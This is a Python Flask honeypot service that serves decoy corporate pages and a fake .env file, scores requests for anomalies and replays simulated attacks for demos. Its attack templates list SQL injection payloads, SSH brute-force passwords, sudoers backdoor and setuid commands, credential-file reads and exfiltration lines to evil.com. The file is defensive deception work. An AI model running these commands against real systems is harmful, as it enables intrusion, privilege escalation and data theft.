"""
PHANTOM Layer 1 â€” Flask Honeypot + Simulation Endpoint
Cloud Run service that lures attackers and emits events to Pub/Sub.
"""

import os
import sys
import json
import time
import uuid
import logging
import threading
import random
from datetime import datetime, timezone
from functools import wraps

import numpy as np
from flask import Flask, request, jsonify, render_template_string, Response
from sklearn.ensemble import IsolationForest

# Add shared module to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "shared"))
from event_bus import get_event_bus, parse_pubsub_message

# ---------------------------------------------------------------------------
# App Setup
# ---------------------------------------------------------------------------
app = Flask(__name__)
@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("phantom.layer1")

@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response

@app.route("/", defaults={"path": ""}, methods=["OPTIONS"])
@app.route("/<path:path>", methods=["OPTIONS"])
def options_handler(path):
    return "", 204

bus = None

def get_bus():
    global bus
    if bus is None:
        bus = get_event_bus()
    return bus

# ---------------------------------------------------------------------------
# Anomaly Detection â€” Isolation Forest
# ---------------------------------------------------------------------------
class AnomalyDetector:
    """Lightweight Isolation Forest for real-time anomaly scoring."""

    def __init__(self):
        self.model = IsolationForest(
            n_estimators=100, contamination=0.1, random_state=42
        )
        self._fit_baseline()
        self.request_history = {}

    def _fit_baseline(self):
        """Pre-fit on synthetic 'normal' traffic patterns."""
        np.random.seed(42)
        normal = np.column_stack([
            np.random.poisson(2, 500),       # request_rate (per min)
            np.random.randint(1, 5, 500),    # unique_paths
            np.random.uniform(0, 0.1, 500),  # error_rate
            np.random.randint(50, 500, 500), # payload_size
            np.random.uniform(0, 300, 500),  # time_since_first (sec)
        ])
        self.model.fit(normal)
        logger.info("Anomaly detector fitted on baseline data")

    def score_request(self, ip: str, path: str, payload_size: int) -> float:
        """Score a request. Returns 0-100 anomaly score."""
        now = time.time()
        if ip not in self.request_history:
            self.request_history[ip] = {
                "first_seen": now, "requests": [], "paths": set(), "errors": 0
            }

        hist = self.request_history[ip]
        hist["requests"].append(now)
        hist["paths"].add(path)

        # Clean old requests (last 60s window)
        hist["requests"] = [r for r in hist["requests"] if now - r < 60]

        features = np.array([[
            len(hist["requests"]),
            len(hist["paths"]),
            hist["errors"] / max(len(hist["requests"]), 1),
            payload_size,
            now - hist["first_seen"],
        ]])

        raw_score = self.model.score_samples(features)[0]
        # Convert to 0-100 (more negative = more anomalous)
        anomaly_score = max(0, min(100, int((1 - (raw_score + 0.5)) * 100)))
        return anomaly_score


detector = AnomalyDetector()

# ---------------------------------------------------------------------------
# Session Tracking
# ---------------------------------------------------------------------------
active_sessions = {}  # ip -> session_id


def get_or_create_session(ip: str, is_simulated: bool = False) -> str:
    """Get existing session for IP or create a new one."""
    if ip in active_sessions:
        return active_sessions[ip]

    session_id = get_bus().create_session(ip, is_simulated=is_simulated)
    active_sessions[ip] = session_id
    get_bus().publish_new_session(session_id, ip, is_simulated=is_simulated)
    return session_id


def log_honeypot_hit(path: str, method: str = "GET", extra: dict = None):
    """Log a honeypot route hit and publish to Pub/Sub."""
    ip = request.remote_addr or "unknown"
    payload_size = request.content_length or 0
    anomaly = detector.score_request(ip, path, payload_size)

    session_id = get_or_create_session(ip)
    command = f"{method} {path}"
    if extra:
        command += f" | {json.dumps(extra)}"

    get_bus().publish_command(session_id, command, source="real", attacker_ip=ip)

    if anomaly > 50:
        get_bus().update_session(session_id, {"threat_score": anomaly})

    logger.info(f"[TRAP] {ip} -> {method} {path} | anomaly={anomaly}")
    return session_id, anomaly


# ---------------------------------------------------------------------------
# Honeypot HTML Templates
# ---------------------------------------------------------------------------
HOMEPAGE_HTML = """<!DOCTYPE html>
<html><head><title>Nexus Corp â€” Internal Portal</title>
<style>
body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px}
.header{background:#1a237e;color:white;padding:20px;text-align:center}
.nav{background:#283593;padding:10px}
.nav a{color:#90caf9;margin:0 15px;text-decoration:none}
.content{max-width:800px;margin:20px auto;padding:20px;background:white;
  border-radius:4px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
</style></head>
<body>
<div class="header"><h1>Nexus Corp</h1><p>Employee Portal v3.2.1</p></div>
<div class="nav">
<a href="/login">Login</a>
<a href="/admin">Admin</a>
<a href="/staff">Staff Directory</a>
</div>
<div class="content">
<h2>Welcome to the Internal Portal</h2>
<p>Please <a href="/login">sign in</a> to access internal resources.</p>
<p><small>Build 3.2.1-rc4 | &copy; 2024 Nexus Corp</small></p>
<!-- TODO: Remove debug endpoint before production -->
<!-- DEBUG: /backup/db.zip -->
</div></body></html>"""

LOGIN_HTML = """<!DOCTYPE html>
<html><head><title>Login â€” Nexus Corp</title>
<style>
body{font-family:Arial,sans-serif;display:flex;justify-content:center;
  align-items:center;height:100vh;background:#1a237e;margin:0}
.login-box{background:white;padding:40px;border-radius:8px;width:350px;
  box-shadow:0 4px 20px rgba(0,0,0,0.3)}
h2{text-align:center;color:#1a237e}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;
  border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a237e;color:white;border:none;
  border-radius:4px;cursor:pointer;font-size:16px}
.error{color:red;text-align:center;margin-top:10px}
</style></head>
<body><div class="login-box">
<h2>Nexus Corp Login</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<p class="error" id="err"></p>
</div></body></html>"""

ADMIN_HTML = """<!DOCTYPE html>
<html><head><title>Admin Panel â€” Nexus Corp</title>
<style>
body{font-family:monospace;background:#0a0a0a;color:#00ff88;padding:20px}
.panel{border:1px solid #00ff88;padding:20px;margin:10px 0}
h1{color:#ff4444}
table{width:100%;border-collapse:collapse;margin:10px 0}
td,th{border:1px solid #333;padding:8px;text-align:left}
</style></head>
<body>
<h1>âš  ADMIN PANEL â€” RESTRICTED ACCESS</h1>
<div class="panel">
<h3>System Status</h3>
<table>
<tr><th>Service</th><th>Status</th><th>Uptime</th></tr>
<tr><td>MySQL 8.0</td><td style="color:#00ff88">â— Running</td><td>47d 12h</td></tr>
<tr><td>Redis 7.2</td><td style="color:#00ff88">â— Running</td><td>47d 12h</td></tr>
<tr><td>Nginx 1.24</td><td style="color:#00ff88">â— Running</td><td>47d 12h</td></tr>
<tr><td>Backup Agent</td><td style="color:#ffaa00">â— Degraded</td><td>3d 2h</td></tr>
</table>
</div>
<div class="panel">
<h3>Quick Links</h3>
<p><a href="/backup/db.zip" style="color:#00ff88">Download DB Backup</a></p>
<p><a href="/phpmyadmin" style="color:#00ff88">phpMyAdmin</a></p>
<p><a href="/staff" style="color:#00ff88">Staff Directory</a></p>
</div>
</body></html>"""

FAKE_ENV = """APP_NAME=NexusCorp
APP_ENV=production
APP_DEBUG=true
APP_KEY=base64:k8Jf3kL9mN2pQ5rT7vX0zA==

DB_HOST=10.128.0.5
DB_PORT=3306
DB_DATABASE=nexus_production
DB_USERNAME=admin
DB_PASSWORD=Nxs_pr0d_2024!@#

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=nexus-backups-prod

REDIS_HOST=10.128.0.6
REDIS_PASSWORD=r3d1s_s3cur3_2024

SMTP_HOST=smtp.nexuscorp.internal
SMTP_USERNAME=noreply@nexuscorp.com
SMTP_PASSWORD=Smtp_N3xus_2024

STRIPE_SECRET_KEY=sk_live_51H3xAmPl3K3y00000000
STRIPE_WEBHOOK_SECRET=whsec_f4k3w3bh00k
"""

PHPMYADMIN_HTML = """<!DOCTYPE html>
<html><head><title>phpMyAdmin 5.2.1</title>
<style>
body{font-family:Arial;background:#2b2b2b;color:#eee;padding:20px}
.header{background:#456;padding:15px;margin-bottom:20px}
.login{max-width:400px;margin:50px auto;background:#333;padding:30px;
  border-radius:4px}
input{width:100%;padding:10px;margin:5px 0;background:#444;color:#eee;
  border:1px solid #555;box-sizing:border-box}
button{background:#2196F3;color:white;padding:10px 20px;border:none;
  cursor:pointer;width:100%;margin-top:10px}
</style></head>
<body>
<div class="header">
<img alt="phpMyAdmin" width="24" height="24">
phpMyAdmin 5.2.1 â€” MySQL 8.0.35
</div>
<div class="login">
<h3>Log in</h3>
<form method="POST"><input name="pma_username" placeholder="Username" value="root">
<input name="pma_password" type="password" placeholder="Password">
<select name="pma_servername"><option>10.128.0.5</option></select>
<button type="submit">Log in</button></form>
</div></body></html>"""


# ---------------------------------------------------------------------------
# Flask Routes â€” Honeypot Traps
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    log_honeypot_hit("/")
    return HOMEPAGE_HTML

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        log_honeypot_hit("/login", "POST", {"username": username, "password": "***"})
        return render_template_string(
            LOGIN_HTML + '<script>document.getElementById("err").textContent='
            '"Invalid credentials. Attempt logged.";</script>'
        )
    log_honeypot_hit("/login")
    return LOGIN_HTML

@app.route("/admin")
def admin():
    log_honeypot_hit("/admin")
    return ADMIN_HTML

@app.route("/.env")
def env_file():
    log_honeypot_hit("/.env")
    return Response(FAKE_ENV, mimetype="text/plain")

@app.route("/phpmyadmin")
def phpmyadmin():
    log_honeypot_hit("/phpmyadmin")
    return PHPMYADMIN_HTML

@app.route("/backup/db.zip")
def backup():
    log_honeypot_hit("/backup/db.zip")
    # Return a tiny fake zip-like binary
    fake_header = b"PK\x03\x04" + b"\x00" * 26 + b"nexus_prod_backup.sql"
    fake_data = b"-- MySQL dump 10.13\n-- Server version 8.0.35\n"
    fake_data += b"CREATE TABLE users (id INT, email VARCHAR(255), "
    fake_data += b"password_hash VARCHAR(255));\n"
    fake_data += b"INSERT INTO users VALUES (1,'admin@nexuscorp.com',"
    fake_data += b"'$2b$12$fakehashvalue');\n"
    return Response(
        fake_header + fake_data,
        mimetype="application/zip",
        headers={"Content-Disposition": "attachment; filename=db.zip"}
    )

@app.route("/staff")
def staff():
    log_honeypot_hit("/staff")
    staff_data = [
        {"name": "James Mitchell", "role": "CEO", "email": "j.mitchell@nexuscorp.com"},
        {"name": "Sarah Chen", "role": "CTO", "email": "s.chen@nexuscorp.com"},
        {"name": "David Kowalski", "role": "VP Engineering", "email": "d.kowalski@nexuscorp.com"},
        {"name": "Maria Gonzalez", "role": "Lead DBA", "email": "m.gonzalez@nexuscorp.com"},
        {"name": "Alex Thompson", "role": "SRE Manager", "email": "a.thompson@nexuscorp.com"},
    ]
    rows = "".join(
        f"<tr><td>{s['name']}</td><td>{s['role']}</td><td>{s['email']}</td></tr>"
        for s in staff_data
    )
    return f"""<!DOCTYPE html><html><head><title>Staff â€” Nexus Corp</title>
    <style>body{{font-family:Arial;background:#f5f5f5;padding:20px}}
    table{{width:100%;border-collapse:collapse;background:white}}
    td,th{{border:1px solid #ddd;padding:12px}}</style></head>
    <body><h1>Staff Directory</h1>
    <table><tr><th>Name</th><th>Role</th><th>Email</th></tr>{rows}</table>
    </body></html>"""

@app.route("/api/health")
def health():
    return jsonify({"status": "healthy", "service": "phantom-layer1-honeypot"})

# ---------------------------------------------------------------------------
# Simulation Endpoint
# ---------------------------------------------------------------------------
ATTACK_TEMPLATES = {
    "sql_injection": [
        "GET /login",
        "POST /login | username=' OR 1=1 --, password=test",
        "POST /login | username=admin' UNION SELECT * FROM users--, password=x",
        "GET /admin",
        "POST /login | username=admin'; DROP TABLE users;--, password=x",
        "GET /.env",
        "GET /backup/db.zip",
        "POST /login | username=admin' AND SLEEP(5)--, password=x",
        "GET /phpmyadmin",
        "POST /login | username=' UNION SELECT password FROM users LIMIT 1--, password=x",
    ],
    "ssh_brute": [
        "ssh root@target -p 2222",
        "ssh admin@target -p 2222",
        "ssh ubuntu@target -p 2222",
        "ssh test@target -p 2222",
        "ssh root@target -p 2222 | password=toor",
        "ssh root@target -p 2222 | password=123456",
        "ssh root@target -p 2222 | password=admin",
        "ssh root@target -p 2222 | password=password",
        "ssh root@target -p 2222 | password=root",
        "ssh admin@target -p 2222 | password=admin123",
        "whoami",
        "cat /etc/passwd",
        "ls -la /root",
        "find / -name '*.db'",
    ],
    "directory_enum": [
        "GET /",
        "GET /admin",
        "GET /login",
        "GET /.env",
        "GET /.git/config",
        "GET /wp-admin",
        "GET /wp-login.php",
        "GET /phpmyadmin",
        "GET /backup/db.zip",
        "GET /api/v1/users",
        "GET /robots.txt",
        "GET /sitemap.xml",
        "GET /.htaccess",
        "GET /server-status",
        "GET /staff",
    ],
    "privilege_esc": [
        "whoami",
        "id",
        "uname -a",
        "cat /etc/passwd",
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "ls -la /etc/shadow",
        "cat /etc/sudoers",
        "sudo su",
        "sudo bash",
        "echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "chmod +s /bin/bash",
    ],
    "data_theft": [
        "GET /",
        "GET /admin",
        "GET /.env",
        "find / -name '*.db' -o -name '*.sql'",
        "cat /var/www/html/.env",
        "mysqldump -u admin -p nexus_production",
        "GET /backup/db.zip",
        "tar czf /tmp/data.tar.gz /var/www/html",
        "curl -X POST http://evil.com/exfil -d @/tmp/data.tar.gz",
        "wget http://evil.com/nc -O /tmp/nc",
        "cat /root/.ssh/id_rsa",
        "cat /root/.aws/credentials",
        "GET /staff",
        "scp /tmp/data.tar.gz attacker@evil.com:/loot/",
    ],
}


def run_simulation(session_id: str, attack_type: str, difficulty: int,
                   num_commands: int, duration_seconds: int, attacker_ip: str):
    """Background thread that drip-feeds simulated attack events."""
    try:
        eb = get_bus()
        template = ATTACK_TEMPLATES.get(attack_type, ATTACK_TEMPLATES["sql_injection"])

        # Scale commands based on difficulty
        commands = []
        for i in range(num_commands):
            cmd = template[i % len(template)]
            # Higher difficulty adds obfuscation/complexity
            if difficulty >= 7 and random.random() > 0.5:
                cmd += " | encoded:base64"
            commands.append(cmd)

        delay = duration_seconds / max(len(commands), 1)

        for i, cmd in enumerate(commands):
            eb.publish_command(session_id, cmd, source="simulated",
                               attacker_ip=attacker_ip)
            # Update threat score progressively
            progress = (i + 1) / len(commands)
            score = int(min(100, difficulty * 10 * progress))
            eb.update_session(session_id, {"threat_score": score})

            time.sleep(delay)

        # End session and trigger report
        eb.end_session(session_id)
        eb.publish_disconnect(session_id)
        logger.info(f"Simulation complete: {session_id}")

    except Exception as e:
        logger.error(f"Simulation error for {session_id}: {e}")


@app.route("/api/simulate-attack", methods=["POST"])
def simulate_attack():
    """Launch a simulated attack for demo/testing purposes."""
    data = request.get_json(silent=True) or {}

    attack_type = data.get("attack_type", "sql_injection")
    difficulty = max(1, min(10, data.get("difficulty", 5)))
    attacker_ip = data.get("attacker_ip", "192.168.1.100")
    num_commands = max(5, min(20, data.get("num_commands", 10)))
    duration_seconds = max(10, min(300, data.get("duration_seconds", 60)))

    if attack_type not in ATTACK_TEMPLATES:
        return jsonify({"error": f"Unknown attack_type. Options: {list(ATTACK_TEMPLATES.keys())}"}), 400

    # Create simulated session
    session_id = get_bus().create_session(attacker_ip, is_simulated=True)
    active_sessions[attacker_ip] = session_id

    # Enrich with geo data for simulated IPs
    simulated_geos = {
        "192.168.1.100": {"country": "Russia", "city": "Moscow", "lat": 55.75, "lon": 37.62, "isp": "Rostelecom"},
        "10.0.0.50": {"country": "China", "city": "Beijing", "lat": 39.90, "lon": 116.40, "isp": "China Telecom"},
        "172.16.0.1": {"country": "North Korea", "city": "Pyongyang", "lat": 39.03, "lon": 125.75, "isp": "Star JV"},
        "127.0.0.1": {"country": "Local", "city": "Localhost", "lat": 0, "lon": 0, "isp": "Loopback"},
    }
    geo = simulated_geos.get(attacker_ip, {
        "country": "Unknown", "city": "Unknown",
        "lat": random.uniform(-60, 60), "lon": random.uniform(-180, 180),
        "isp": "Unknown ISP"
    })
    get_bus().update_session(session_id, {"geo": geo})

    # Publish new session event
    get_bus().publish_new_session(session_id, attacker_ip, is_simulated=True)

    # Launch simulation in background thread
    thread = threading.Thread(
        target=run_simulation,
        args=(session_id, attack_type, difficulty, num_commands,
              duration_seconds, attacker_ip),
        daemon=True,
    )
    thread.start()

    return jsonify({
        "status": "simulation_started",
        "session_id": session_id,
        "attack_type": attack_type,
        "difficulty": difficulty,
        "num_commands": num_commands,
        "duration_seconds": duration_seconds,
        "attacker_ip": attacker_ip,
    }), 202


@app.route("/api/session/<session_id>", methods=["GET"])
def get_session(session_id):
    """Get session status (used by frontend to poll simulation progress)."""
    data = get_bus().get_session(session_id)
    if not data:
        return jsonify({"error": "Session not found"}), 404
    return jsonify(data)


@app.route("/api/sessions", methods=["GET"])
def list_sessions():
    """List recent sessions."""
    sessions = get_bus().db.collection("sessions").order_by(
        "start_time", direction="DESCENDING"
    ).limit(20).stream()
    result = []
    for s in sessions:
        d = s.to_dict()
        d["session_id"] = s.id
        result.append(d)
    return jsonify(result)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)


